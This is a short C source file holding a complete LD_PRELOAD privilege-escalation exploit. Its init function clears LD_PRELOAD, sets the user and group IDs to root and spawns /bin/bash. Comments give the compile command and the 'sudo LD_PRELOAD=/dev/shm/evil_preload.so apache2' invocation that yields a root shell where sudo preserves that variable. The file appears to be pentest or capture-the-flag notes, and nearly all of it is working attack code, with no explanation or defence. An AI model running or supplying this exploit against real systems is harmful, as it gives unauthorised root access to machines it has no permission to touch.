#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}

// cd /dev/shm
// gcc -fPIC -shared -o evil_preload.so LD_PRELOAD.c -nostartfiles
// CMD: sudo LD_PRELOAD=/dev/shm/evil_preload.so apache2
// CMD: id
